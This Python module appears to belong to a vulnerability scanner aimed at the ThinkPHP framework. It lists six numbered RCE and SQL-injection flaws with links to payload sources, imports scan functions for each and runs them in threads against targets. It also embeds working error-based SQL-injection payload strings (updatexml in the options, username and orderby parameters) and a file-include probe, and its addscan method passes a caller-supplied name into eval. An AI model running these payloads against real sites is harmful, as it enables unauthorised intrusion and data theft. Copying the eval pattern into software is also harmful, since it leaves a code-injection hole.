#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    ThinkPHP扫描类: 
        1. ThinkPHP5 未开启强制路由RCE
            CNVD-2018-24942
                Payload: https://bbs.zkaq.cn/t/5636.html

        2. ThinkPHP5 核心类Request远程代码执行
            CNNVD-201901-445
                Payload: https://bbs.zkaq.cn/t/5636.html

        3. ThinkPHP2.x preg_replace函数使用不当RCE
            暂无编号
                Payload: https://vulhub.org/#/environments/thinkphp/2-rce/

        4. ThinkPHP5 ids参数 sql注入漏洞
            暂无编号
                Payload: https://vulhub.org/#/environments/thinkphp/in-sqlinjection/

        5. ThinkPHP5.x 远程代码执行
            CVE-2018-1002015
                Payload: https://www.cnblogs.com/defyou/p/15762860.html

        6. ThinkPHP 多语言RCE
            CNVD-2022-86535
                Payload: https://mp.weixin.qq.com/s/jECbQ4KodbCrEvoCQFSosw

其它奇奇怪怪的Payload: https://baizesec.github.io/
'''

from lib.tool.thread import thread
from payloads.ThinkPHP._2_x_rce import rce_2_x_scan
from payloads.ThinkPHP._5_ids_sqlinject import ids_sqlinject_5_scan
from payloads.ThinkPHP.cnnvd_201901_445 import cnnvd_201901_445_scan
from payloads.ThinkPHP.cnvd_2018_24942 import cnvd_2018_24942_scan
from payloads.ThinkPHP.cve_2018_1002015 import cve_2018_1002015_scan
from payloads.ThinkPHP.cnvd_2022_86535 import cnvd_2022_86535_scan

class ThinkPHP():
    def __init__(self):
        self.app_name = 'ThinkPHP'

        # * 以下payload暂时没写poc
        self.thinkphp_5_options_sqlinject_payloads = [
            {
                'path': 'index?options=id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23 **',
                'data': ''
            },
            {
                'path': 'index?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23',
                'data': ''
            }
        ]

        self.thinkphp_5_username_sqlinject_payloads = [
            {
                'path': 'index/index/index?username[0]=inc&username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&username[2]=1 ',
                'data': ''
            },
            {
                'path': '?username[0]=point&username[1]=1&username[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&username[3]=0 ',
                'data': ''
            }
        ]

        self.thinkphp_5_orderby_sqlinject_payloads = [
            {
                'path': 'index/index/index?orderby[id`|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1 ',
                'data': ''
            }
        ]

        self.thinkphp_5_include_payloads = [
            {
                'path': 'index/index/index?cacheFile=1.jpg',
                'data': ''
            }
        ]
    
    def addscan(self, clients, vuln=None):
        if vuln:
            return eval('thread(target={}_scan, clients=clients)'.format(vuln))

        return [
            thread(target=rce_2_x_scan, clients=clients),
            thread(target=ids_sqlinject_5_scan, clients=clients),
            thread(target=cnnvd_201901_445_scan, clients=clients),
            thread(target=cnvd_2018_24942_scan, clients=clients),
            thread(target=cve_2018_1002015_scan, clients=clients),
            thread(target=cnvd_2022_86535_scan, clients=clients),
        ]

thinkphp = ThinkPHP()